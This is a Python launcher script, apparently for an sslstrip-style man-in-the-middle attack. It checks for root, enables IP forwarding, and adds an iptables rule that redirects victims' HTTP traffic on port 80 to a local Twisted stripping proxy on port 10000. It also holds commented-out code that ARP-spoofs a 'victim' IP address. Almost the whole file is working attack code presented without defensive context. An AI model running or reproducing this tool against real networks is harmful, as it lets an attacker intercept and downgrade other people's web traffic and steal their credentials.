import os
import logging

from twisted.internet import reactor
from twisted.web import http

from arpspoof import ARP
from multiprocessing import Process

from StrippingProxy import StrippingProxy

import atexit


def exit_handler():
    Setting.off()
    print('Bye~')


atexit.register(exit_handler)


class Setting:
    def __init__(self):
        pass

    @staticmethod
    def __exec_shell(command):
        return os.popen(command).read()

    @classmethod
    def _enable_ip_forwarding(cls):
        cls.__exec_shell('echo "1" > /proc/sys/net/ipv4/ip_forward')

    @classmethod
    def _disable_ip_forwarding(cls):
        cls.__exec_shell('echo "0" > /proc/sys/net/ipv4/ip_forward')

    @classmethod
    def _enable_intercept_http_packet(cls):
        cls.__exec_shell('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')

    @classmethod
    def _disable_intercept_http_packet(cls):
        cls.__exec_shell('iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 ')

    @classmethod
    def on(cls):
        cls._enable_ip_forwarding()
        cls._enable_intercept_http_packet()

    @classmethod
    def off(cls):
        cls._disable_ip_forwarding()
        cls._disable_intercept_http_packet()


def run_arp(victim_ip):
    arp = ARP(victim_ip)
    arp.run()


def main():
    if 0 == os.getuid():
        pass
    else:
        print("We need root permission")
        exit()

    # victim_ip = input("Victim: ")
    # victim_ip = '192.168.0.39'
    # arp_process = Process(target=run_arp, args=(victim_ip,))
    # arp_process.start()

    Setting.on()

    # Using Twisted
    logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(message)s',
                        filename='sslstrip.log', filemode='w')

    strippingFactory = http.HTTPFactory(timeout=10)
    strippingFactory.protocol = StrippingProxy

    reactor.listenTCP(int(10000), strippingFactory)

    print("Running")

    try:
        reactor.run()
    except KeyboardInterrupt:
        print("Bye~")
        Setting.off()
        # escape process
        # arp_process.join()


if __name__ == '__main__':
    main()
